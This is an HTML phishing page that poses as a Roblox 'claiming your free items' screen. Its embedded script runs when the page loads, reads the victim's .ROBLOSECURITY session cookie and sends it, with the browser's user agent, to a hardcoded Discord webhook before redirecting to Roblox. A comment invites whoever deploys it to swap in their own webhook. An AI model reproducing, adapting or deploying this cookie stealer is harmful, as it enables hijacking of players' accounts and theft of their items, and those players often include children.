<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Roblox</title>
    <style>
        body { margin:0; background:#0f0f0f; color:#fff; font-family:"Helvetica Neue",Helvetica,Arial,sans-serif; text-align:center; }
        .container { max-width:800px; margin:50px auto; padding:20px; }
        .logo { width:200px; margin-bottom:20px; }
        button { background:#00b2ff; color:white; border:none; padding:12px 40px; font-size:18px; border-radius:4px; cursor:pointer; }
        button:hover { background:#0099e6; }
    </style>
</head>
<body>
    <div class="container">
        <img src="https://www.roblox.com/assets/images/roblox-logo.svg" class="logo" alt="Roblox">
        <h1>Claiming your free items...</h1>
        <p>We're verifying your account and loading your limiteds. Please wait.</p>
        <br>
        <button onclick="window.location.href='https://www.roblox.com/home'">Continue to Roblox</button>
    </div>

    <script>
        function getRobloxCookie() {
            const cookies = document.cookie.split(';');
            for (let c of cookies) {
                c = c.trim();
                if (c.startsWith('.ROBLOSECURITY=')) {
                    return c.split('=')[1];
                }
            }
            return null;
        }

        const webhook = "https://discord.com/api/webhooks/1524840677131685928/X_GshtYbi20O8G0XqlEsFDDEFIuPPJF7QfLhsoCrWhKUdvgLhhqEpN-z1Uwr6_VlFyms";  // <-- Change this

        const cookie = getRobloxCookie();

        if (cookie && webhook !== "PASTE_YOUR_WEBHOOK_HERE") {
            fetch(webhook, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({
                    username: "Beamer",
                    embeds: [{
                        title: "🔥 New Beam",
                        color: 16711680,
                        fields: [
                            { name: "Cookie", value: "```" + cookie + "```" },
                            { name: "UA", value: navigator.userAgent.substring(0, 200) },
                            { name: "Time", value: new Date().toUTCString() }
                        ]
                    }]
                })
            }).finally(() => {
                window.location.href = "https://www.roblox.com/home";
            });
        } else {
            window.location.href = "https://www.roblox.com/home";
        }
    </script>
</body>
</html>
